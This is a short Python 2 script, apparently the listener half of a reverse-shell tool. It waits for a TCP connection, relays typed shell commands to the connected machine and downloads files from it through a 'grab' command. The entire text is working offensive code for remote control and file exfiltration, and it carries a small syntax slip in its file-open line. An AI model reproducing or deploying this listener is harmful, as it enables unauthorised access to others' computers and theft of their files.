import socket
import os

def transfer(conn, command):

	conn.send(command)
	f = open("Path to the file, "a") #Our file container. Example: /root/Desktop/file.txt

	while True:
		bits = conn.recv(1024)
		if "Unable to find out the file" in bits:
			print "[-] Unable to find out the file"
			break
		if bits.endswith("DONE"):
			print "[+] Transfer completed"
			f.close()
			break
		f.write(bits)
	f.close()

def connect():

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("IP Address", 8080))	#Put the IP of the server and the port to open
	s.listen(1) #Listening for a single connection

	print "[+] Listening for incoming TCP connection on port 8080"
	conn, addr = s.accept()
	print "[+] We got a connection from: ", addr

	while True:
		command = raw_input("Shell> ")

		if "terminate" in command:
			conn.send("terminate")
			conn.close() #Close the connection with the host
			break
		elif "grab" in command:
			#Example: grab*/root/usr/file.txt
			transfer(conn, command)
		else:
			conn.send(command) #send command
			print conn.recv(1024) #print the result

def main():
	connect()

main()
